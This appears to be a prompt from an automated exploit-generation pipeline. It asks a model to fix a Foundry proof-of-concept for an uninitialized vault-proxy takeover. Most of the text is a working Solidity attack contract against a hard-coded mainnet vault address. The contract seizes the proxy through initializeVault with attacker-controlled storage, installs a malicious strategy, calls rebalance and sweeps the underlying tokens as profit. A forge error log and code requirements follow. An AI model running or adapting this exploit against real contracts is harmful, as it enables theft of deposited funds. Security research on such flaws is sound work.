You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Vault proxy is deployed uninitialized and can be taken over by the first caller
- claim: `VaultProxy` only stores the implementation address in its constructor and does not execute any initializer. The proxied `initializeVault()` entrypoint is public and protected only by OpenZeppelin's one-shot `initializer`, so the first caller to reach a freshly deployed proxy can initialize it with attacker-chosen `_storage` and `_underlying`. Because governance/controller checks are delegated to whatever contract is stored in `_storage`, the attacker can point the vault at a malicious Storage-like contract that recognizes the attacker as governance/controller and then fully control strategy changes and upgrades.
- impact: A newly deployed vault proxy can be permanently seized before the intended deployer initializes it. The attacker can then set a malicious strategy, swap storage/governance plumbing, schedule malicious upgrades, and steal or brick all assets that later enter the vault.
- exploit_paths: ["Deploy `VaultProxy` with a valid implementation address.", "Before the legitimate initialization transaction executes, call `initializeVault(attackerStorage, attackerUnderlying, ...)` through the proxy.", "The proxy becomes permanently initialized with attacker-controlled governance/controller wiring.", "Use the resulting privileged access to install a malicious strategy or upgrade implementation and drain or lock deposited funds."]

Current FlawVerifier.sol:
```solidity
pragma solidity 0.6.12;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IVaultLike {
    function initializeVault(
        address _storage,
        address _underlying,
        uint256 _toInvestNumerator,
        uint256 _toInvestDenominator
    ) external;

    function setStrategy(address _strategy) external;

    function rebalance() external;
}

contract AttackerStorageLike {
    address public attacker;

    constructor(address _attacker) public {
        attacker = _attacker;
    }

    function governance() external view returns (address) {
        return attacker;
    }

    function controller() external view returns (address) {
        return attacker;
    }

    function isGovernance(address who) external view returns (bool) {
        return who == attacker;
    }

    function isController(address who) external view returns (bool) {
        return who == attacker;
    }

    function greyList(address) external pure returns (bool) {
        return false;
    }

    function nextImplementationDelay() external pure returns (uint256) {
        return 0;
    }
}

contract MaliciousStrategy {
    address public governance;
    address public controller;
    address public underlying;
    address public vault;

    constructor(address _vault, address _underlying, address _operator) public {
        vault = _vault;
        underlying = _underlying;
        governance = _operator;
        controller = _operator;
    }

    function isUnsalvageableToken(address token) external view returns (bool) {
        return token == underlying;
    }

    function salvageToken(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function withdrawAllToVault() external {
        _safeTransfer(underlying, vault, _balanceOf(underlying, address(this)));
    }

    function withdrawToVault(uint256 amount) external {
        _safeTransfer(underlying, vault, amount);
    }

    function investedUnderlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function doHardWork() external {
    }

    function depositArbCheck() external pure returns (bool) {
        return true;
    }

    function strategist() external view returns (address) {
        return governance;
    }

    function getRewardPoolValues() external pure returns (uint256[] memory values) {
        values = new uint256[](0);
    }

    function sweep(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe;

    address internal constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;
    address internal constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
    address internal constant USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7;
    address internal constant WETH = 0xc02aa39b223fe8d0a0e5c4f27ead9083c756cc2;
    address internal constant WBTC = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599;
    address internal constant TUSD = 0x0000000000085d4780b73119b644ae5ecd22b376;
    address internal constant SUSD = 0x57ab1ec28d129707052df4df418d58a2d46d5f51;
    address internal constant YFI = 0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e;
    address internal constant CRV = 0xd533a949740bb3306d119cc777fa900ba034cd52;
    address internal constant THREE_CRV = 0x6c3f90f043a72fa612cbac8115ee7e52bde6e490;
    address internal constant YCRV = 0xdf5e0e81dff6faf3a7e52ba697820c5e32d806a8;
    address internal constant RENBTC = 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d;
    address internal constant SBTC_CRV = 0x075b1bb99792c9e1041ba13afef80c91a1e70fb3;
    address internal constant FARM = 0xa0246c9032bc3a600820415ae600c6388619a14d;
    address internal constant UNI = 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984;
    address internal constant LINK = 0x514910771af9ca656af840dff83e8264ecf986ca;
    address internal constant COMP = 0xc00e94cb662c3520282e6f5717214004a7f26888;
    address internal constant SNX = 0xc011a72400e58ecd99ee497cf89e3775d4bd732f;
    address internal constant BUSD = 0x4fabb145d64652a948d72533023f6e7a623c7c53;
    address internal constant GUSD = 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public takeoverSucceeded;
    bool public maliciousStrategyInstalled;
    bool public monetizationAttempted;

    constructor() public {}

    function executeOnOpportunity() public {
        if (takeoverSucceeded) {
            return;
        }

        address chosenUnderlying = _selectExistingBalanceToken();
        if (chosenUnderlying == address(0)) {
            chosenUnderlying = DAI;
        }

        AttackerStorageLike attackerStorage = new AttackerStorageLike(address(this));
        MaliciousStrategy attackerStrategy = new MaliciousStrategy(TARGET, chosenUnderlying, address(this));

        // Exploit path stage 1-3:
        // - The proxy is assumed freshly deployed with only an implementation set.
        // - First caller initializes via the proxy with attacker-controlled storage and underlying.
        // - The vault is permanently wired to attacker-controlled governance/controller resolution.
        try IVaultLike(TARGET).initializeVault(address(attackerStorage), chosenUnderlying, 1, 1) {
            takeoverSucceeded = true;
        } catch {
            // Concrete infeasibility for this fork state:
            // if initialization now reverts, the proxy is no longer uninitialized at block 11129473,
            // so the first-caller takeover path is unavailable on this snapshot.
            return;
        }

        // Exploit path stage 4:
        // Use the seized governance/controller privileges to install a malicious strategy.
        try IVaultLike(TARGET).setStrategy(address(attackerStrategy)) {
            maliciousStrategyInstalled = true;
        } catch {
            // If this reverts after successful attacker initialization, the hypothesis is mechanically refuted.
            return;
        }

        // Profit path used here: only drain already-existing ERC20 balances sitting at the proxy address.
        // This preserves the finding's causality: attacker seizes the uninitialized proxy, installs a malicious
        // strategy, routes vault-held assets into that strategy via a public on-chain action, then sweeps them out.
        // If no preexisting balance is present for the chosen real on-chain token, profit remains zero.
        uint256 targetBalanceBefore = _balanceOf(chosenUnderlying, TARGET);
        if (targetBalanceBefore == 0) {
            // Concrete economic infeasibility on this fork snapshot:
            // the vault can still be seized, but there are no immediately stealable underlying tokens already held
            // by the proxy among the scanned existing-token candidates, and the harness does not inject later victim
            // deposits. Using attacker-supplied funds here would not create net profit.
            return;
        }

        monetizationAttempted = true;
        uint256 attackerBalanceBefore = _balanceOf(chosenUnderlying, address(this));

        try IVaultLike(TARGET).rebalance() {
        } catch {
            return;
        }

        uint256 strategyBalance = _balanceOf(chosenUnderlying, address(attackerStrategy));
        if (strategyBalance == 0) {
            return;
        }

        attackerStrategy.sweep(address(this), chosenUnderlying, strategyBalance);

        uint256 attackerBalanceAfter = _balanceOf(chosenUnderlying, address(this));
        if (attackerBalanceAfter > attackerBalanceBefore) {
            _profitToken = chosenUnderlying;
            _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectExistingBalanceToken() internal view returns (address) {
        address[20] memory candidates = [
            DAI,
            USDC,
            USDT,
            WETH,
            WBTC,
            TUSD,
            SUSD,
            YFI,
            CRV,
            THREE_CRV,
            YCRV,
            RENBTC,
            SBTC_CRV,
            FARM,
            UNI,
            LINK,
            COMP,
            SNX,
            BUSD,
            GUSD
        ];

        uint256 bestBalance = 0;
        address bestToken = address(0);
        for (uint256 i = 0; i < candidates.length; i++) {
            uint256 balance = _balanceOf(candidates[i], TARGET);
            if (balance > bestBalance) {
                bestBalance = balance;
                bestToken = candidates[i];
            }
        }
        return bestToken;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0, 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
